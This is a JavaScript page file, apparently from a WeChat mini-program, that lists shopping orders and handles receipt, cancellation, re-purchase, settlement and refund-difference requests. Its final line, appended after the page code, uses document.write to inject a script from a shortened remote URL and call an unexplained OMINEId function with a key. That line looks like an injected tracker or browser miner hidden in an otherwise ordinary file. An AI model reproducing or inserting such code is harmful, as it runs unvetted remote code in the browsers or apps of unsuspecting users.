var t = getApp(),
  app=t,
  a = t.requirejs("core"),
  e = t.requirejs("biz/order"),
  $=t.requirejs("jquery");
Page({
  data: {
    icons: t.requirejs("icons"),
    status: "all",
    list: [],
    page: 1,
    code: false,
    show:"",
    loaded:false,
    cancel: e.cancelArray,
    cancelindex: 0,
    buttonText:"v",
    onshowData:false,
    search:{},
    pages:1
  },
  onLoad: function (a) {
    if (a.status){
      this.selected(a.status+"");
    }else{
      this.selected("all");
    };
  },
  onReady:function(){
    if (!this.data.onshowData) return;
    this.get_list(false, 1);
    this.setData({
      status: 'all',
      list: []
    });
  },
  onShow:function(){
    
  },
  get_list: function (addObject, pages,fn) {
    //我的订单
    var _this = this;
    wx.showLoading({
      title: '加载中'
    });
    var datas = {};
    if (addObject) {
      datas = $.extend({
        session_token: t.globalData.session_token,      
      }, addObject);
    } else {
      datas = {
        session_token: t.globalData.session_token,
        show_data:"orderDetail"
      };
    };
    datas.page=pages;
    datas.pageSize=10;
    wx.request({
      url: t.globalData.daxin + "/order/orderList",
      data: datas,
      method: "POST",
      success: function (res) {
        //console.log("order",res);
        wx.hideLoading();
        var request = res.data.request;
        _this.setData({
          onshowData: true
        });
        if(fn)fn();
        if (res.data.statusCode >= 0 && res.data.data.list) {
          var lists = res.data.data.list;
          if ((res.data.data.list.length == 0 || !res.data.data.list) && pages == 1)
            {
              _this.setData({
                empty:true,
                show: true,
                list:[]
            });
            return;
          };
          $.each(lists, function (index, value) {
            var knot_money = 0, total_knot_num = 0, deliver_money=0;
            var knot_retreat_mix = 0;
            value.statusstr = t.getOrderStatus(value).indexOf("(") > 0 ? t.getOrderStatus(value).split("(")[0] : t.getOrderStatus(value);
            if (t.getOrderStatus(value).indexOf("(") > 0) { value.ps="true"};
            if (value.order_retreat&&value.order_retreat.length > 0) value.order_goods = t.getRetreat(value.order_retreat, value.order_goods);
           
            if (value.order_goods){
              var retreat_ok=0;
              $.each(value.order_goods,function(ind,val){
                //val.p_price_true = (val.pay_subtotal/val.p_num).toFixed(6);
                let knot_retreat_status = "";
                if (value.total_deposits > 0) { knot_retreat_status += "订金 "; }
                knot_retreat_mix += parseFloat(val.erp_num - val.retreat_num);
                val.subtotal = parseFloat(val.subtotal).toFixed(2);
                if (value.knot == 2) {
                  total_knot_num += parseFloat(((val.knot_num) * val.p_price_true).toFixed(10));
                  deliver_money += parseFloat(((val.p_num - val.knot_num) * val.p_price_true).toFixed(10));
                }
                val.total = (val.p_price_true * (val.p_num - (val.has_retreat_num || 0) - (value.knot == 2 ? val.knot_num : 0))).toFixed(2);
                val.origin_total = (val.p_price_true *val.p_num ).toFixed(2);
                val.thumb = val.img ? t.globalData.daxinImg + val.img :"";
                if (parseFloat(val.erp_num) <= parseFloat(val.retreat_num) && val.subtotal !=0) { retreat_ok++;};
                if (val.subtotal == 0) { retreat_ok++;};
                if (val.knot_num>0){
                  if (res.data.request.knot) {
                    if (value.knot == 1) { knot_retreat_status += " 结单中 " }
                    else if (value.knot == 2) {
                      if (value['pay_status'] > 0 || value.order_knot) {
                        knot_retreat_status += value.order_knot ? _this.getOrderStatus(value.order_knot.check_status) : " 结单成功 ";
                      } else {
                        knot_retreat_status += " 结单成功 ";
                      }
                    } else if (value.knot == 3) {
                      knot_retreat_status += " 结单失败 "
                    } else {
                      knot_retreat_status += " 取消结单 "
                    }
                  } else {
                    if (value.knot > 0) {
                      knot_retreat_status += " 结单 ";
                    };
                  };
                }
                if (value.is_retreat > 0 && val.retreat_num>0) { knot_retreat_status += " 退换货 "; };
                val.knot_retreat_status = knot_retreat_status;
              });
             // good_list = t.getRetreat(orders.order_retreat, good_list);
              if (retreat_ok == value.order_goods.length){
                value.retreat_ok=false;
              }else{
                value.retreat_ok = true;
              };
            };
            if (value.order_sync_hy.length>0){
              $.each(value.order_sync_hy, function (ind, val) {
                if (val.is_recive<1){
                  value.erp_th_no = val.erp_th_no;
                };
              });
            }
            value.knot_status = value.order_knot ? value.order_knot.check_status:"10000";
            // var knot_retreat_status ="";
            // if (res.data.request.knot) { 
            //   if (value.knot == 1) { knot_retreat_status += " 结单中" }
            //   else if (value.knot == 2) {
            //     if (value['pay_status'] > 0 || value.order_knot){
            //       knot_retreat_status += value.order_knot?_this.getOrderStatus(value.order_knot.check_status):"结单成功";
            //     }else{
            //       knot_retreat_status += " 结单成功";
            //     }
            //   } else if (value.knot == 3) {
            //     knot_retreat_status += " 结单失败"
            //   } else {
            //     knot_retreat_status += " 取消结单"
            //   }
            // }else{
            //   if (value.knot > 0) {
            //     knot_retreat_status += "结单";
            //   };
            // } ;
            // var order;
            // if (value.is_retreat > 0) { knot_retreat_status+="退换货";};
            // if (value.order_type > 0) { knot_retreat_status += " 订金";}
            // value.knot_retreat_status = knot_retreat_status;
            if (request.is_retreat) value.retreat_order_url = '/pages/order/refundList/index?id=' + value.order_sn;            
            value.knot_money = total_knot_num;
            value.deliver_money = Math.ceil((deliver_money + parseFloat(value.order_type > 0 ? value.total_deposits:0))*100)/100;
            value.knot_retreat_mix = knot_retreat_mix;
            value.Alltotall = (value.total - total_knot_num - value.has_retreat_money_total||0 ) > 0 ? (value.total - total_knot_num - value.has_retreat_money_total).toFixed(2):"0.00";
          });
          var oldList=_this.data.list;
          //console.log(lists, lists.concat(oldList));
          var newList = oldList.concat(lists);
          if(pages == 1 && lists.length<10){
            _this.setData({
              list: newList,
              show: true,
              empty: false,
              loaded: true
            });
          }else{
            _this.setData({
              list: newList,
              show: true,
              empty: false,
              loaded: false
            });
          }
        } else {
          if (res.data.msg == "没有数据"){
            var datas = {
              show: true,
              loaded: true
            };
            if(pages >1){
              datas.pages =100;
            }else{
              datas.empty =true;
            }
            _this.setData(datas);
          }else{
            wx.showModal({
              title: '错误提示',
              content: res.data.msg + ',数据获取失败',
              showCancel: false,
              success: function () {
                if (res.confirm) {

                }
              }
            })
          }
        }

      }
    })
  },
  getOrderStatus: function (handleStatus){
    var status = '';
    switch (parseFloat(handleStatus)) {
      case 0: status = '返差额申请中'; break;
      case 1: status = '返差额申请已通过'; break;
      case 5: status = '返差额申请失败'; break;
      case 20: status = '返差额已完成'; break;
     
    }
    return status;
  },
  isrecieve_next: function (data) {
    var _this=this;
    wx.showModal({
      title: '收货提示',
      content: '是否确认收货？',
      success:function(res){
        if(res.confirm){
          recieveing(data);
        }
      }
    })
    //确认收货
    function recieveing(data){
      wx.request({
        url: t.globalData.daxin + "/order/hyReceive",
        data: data,
        method: "POST",
        success: function (res) {
          wx.hideToast();
          //console.log(res);
          if (res.data.statusCode >= 0 ) {
            wx.showModal({
              title: "收货提示",
              content: '收货成功',
              showCancel: false,
              success: function (res) {
                if (res.confirm) {
                  _this.setData({
                    list: [],
                    empty: true,
                    pages: 1,
                    loaded: false
                  }, function () {
                    _this.get_list(_this.data.search, 1);
                  });
                }
              }
            });
          } else {
            wx.showModal({
              title: '提示信息',
              content: res.data.msg,
              showCancel: false,
              success: function (res) {
                if (res.confirm) {
                  //console.log('用户点击确定')
                } else if (res.cancel) {
                  //console.log('用户点击取消')
                }
              }
            })
          }
        }
      })
    }
  },
  selected: function (t) {
    //切换订单
    var e = typeof(t) == "string"?t:a.data(t).type;
    this.setData({
      list: [],
      pages: 1,
      status: e,    
      empty: false

    });
    var obj={};
    switch (e){
      case 'all':break;
      case '0': obj = {pay_status:0};break;
      case '1': obj = {ship_status: 0 };break;
      case '2': obj = { order_receiveProduct: "order_receiveProduct" }; break;//待收货
      case '3': obj = {order_status: 3 };break;
      case '4': obj = {is_retreat: 1 };break;
      case '5': obj = { is_comment: 1, order_status:3 };break;
      case '6': obj = { knot:'knot' }; break;
      case '7': obj = { order_type:1}; break;
      default: break;
    };
    this.setData({
      search: obj
    });
    this.get_list(obj,1);
  },
  onPullDownRefresh:function(){
    var _this=this;     
    //下拉刷新
    this.setData({
      list:[],
      empty: true,
      pages: 1,
      loaded: false
    });
    this.get_list(_this.data.search,1,function(){
        wx.stopPullDownRefresh();
      });
  },
  onReachBottom: function () {
    var pge = this.data.pages;
    var _this=this;
    pge++;
    if(pge>=100){return;};
    if (!this.data.loaded) {
      this.get_list(_this.data.search, pge);
      this.setData({
        pages: pge
      });
    } 
    
   // this.data.loaded || this.get_list(_this.data.search,_this.data.pages);
  },
  handle: function (t) {
    var e = this,
      s = a.pdata(t).type;
    switch (s) {
      case 'agianBuy': 
      //再次购买
        var data = a.pdata(t).data;
        $.each(data,function(ind,val){
          val.pid=val.p_id;
          val.num = val.p_num;
        })
        //console.log(data);
        e.addCart(data,function(){
          wx.switchTab({
            url: '/pages/member/cart/index',
        });     
        });break;
      case 'knot': 
        var order_sn = a.pdata(t).orderid;
        wx.showLoading({
          title: '结单中...',
          icon:'loading'
        });
        e.knot(order_sn,function(){
          wx.hideLoading();
          wx.showToast({
            title: '取消出货成功',
            duration:800,
            success:function(){
              setTimeout(function(){
                e.setData({
                  list: [],
                  empty: true,
                  pages: 1,
                  loaded: false
                },function(){
                  e.get_list(e.data.search, 1);
                });
                
              },800);
            }
          })
          
        }); break;
      case 'difference': e.difference({ order_sn: a.pdata(t).orderid},function(){
        wx.hideLoading();
        wx.showToast({
          title: '提交成功',
          duration: 800,
          success: function () {
            setTimeout(function () {
              e.setData({
                list: [],
                empty: true,
                pages: 1,
                loaded: false
              }, function () {
                e.get_list(e.data.search, 1);
              });

            }, 800);
          }
        })
      }); break;
      case 'is_receipt':
        //收货 
        var data = {
          session_token: app.globalData.session_token,
          order_sn: a.pdata(t).ordersn,
          partid: a.pdata(t).id
        }; 
        e.isrecieve_next(data); break;
      case '3': obj = { order_status: 3 }; break;
      case '4': obj = { is_retreat: 1 }; break;
      case '5': obj = { is_comment: 1 }; break;
      default: break;
    };
  },
  addCart: function (data,fn) {
    //再次购买
    var _this = this;
    wx.request({
      url: t.globalData.daxin + "/basket/basketAction",
      data: {
        session_token: t.globalData.session_token,
        productList: data,
      },
      method: "POST",
      success: function (res) {
        wx.hideLoading();
        if (res.data.statusCode >= 0 && res.data.msg == "success") {
          if (fn)fn();
          //_this.get_list();
        } else {
          wx.showModal({
            title: '提示信息',
            content: res.data.msg + ',加入购物车失败',
            showCancel: false,
            success: function (res) {
              if (res.confirm) {
                //console.log('用户点击确定')
              } else if (res.cancel) {
                //console.log('用户点击取消')
              }
            }
          })
        }
      }
    })
  },
  knot: function (data, fn) {
    //结单
    var _this = this;
    wx.request({
      url: t.globalData.daxin + "/order/knotOrder",
      data: {
        session_token: t.globalData.session_token,
        order_sn: data,
      },
      method: "POST",
      success: function (res) {
        wx.hideLoading();
        if (res.data.statusCode >= 0 ) {
          if (fn) { fn(); };
        } else {
          wx.showModal({
            title: '提示信息',
            content: res.data.msg ,
            showCancel: false,
            success: function (res) {
              if (res.confirm) {
                //console.log('用户点击确定')
              } else if (res.cancel) {
                //console.log('用户点击取消')
              }
            }
          })
        }
      }
    })
  },
  finish: function () {
    return;
    this.setData({
      code: false
    })
  },
  cancel: function (event) {
    //取消订单
    var order_sn = a.data(event).order_sn;
    var _this = this;
    wx.request({
      url: t.globalData.daxin + "/order/cancelOrder",
      data: {
        session_token: t.globalData.session_token,
        order_sn: order_sn,
      },
      method: "POST",
      success: function (res) {
        wx.hideLoading();
        if (res.data.statusCode >= 0) {
          wx.showToast({
            title: '取消成功',
            duration:1000,
            success:function(){
              setTimeout(function(){
                _this.setData({ list:[]},function(){
                  _this.get_list(_this.data.search, 1, function () {
                    //wx.stopPullDownRefresh();
                  });
                });
              },1000);
              
            }
          })
        } else {
          wx.showModal({
            title: '提示信息',
            content: res.data.msg,
            showCancel: false,
            success: function (res) {
              if (res.confirm) {
                //console.log('用户点击确定')
              } else if (res.cancel) {
                //console.log('用户点击取消')
              }
            }
          })
        }
      }
    })
  },
  difference:function(addObj,fn){
    //返差额
    var _this = this;
    var data = {
      session_token: t.globalData.session_token,
      customer_account_type : 2,
      customer_account: '000',
      notify_mobile : '000',
      account_name: '000'
      };
    wx.request({
      url: t.globalData.daxin + "/order/knotOrderMoney",
      data: $.extend(data,addObj),
      method: "POST",
      success: function (res) {
        wx.hideLoading();
        if (res.data.statusCode >= 0) {
          if (fn) { fn(); };
        } else {
          wx.showModal({
            title: '提示信息',
            content: res.data.msg,
            showCancel: false,
            success: function (res) {
              if (res.confirm) {
                //console.log('用户点击确定')
              } else if (res.cancel) {
                //console.log('用户点击取消')
              }
            }
          })
        }
      }
    })
  },
  onShareAppMessage: function () {
    return a.onShareAppMessage()
  },
  moreHandle:function(event){
    var indd= a.pdata(event).self;
    var status = indd;
    if (this.data['buttonStatus'] == indd) { status = "-1";}; 
    this.setData({
      'buttonStatus': status,
      isTurn: status
    });
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
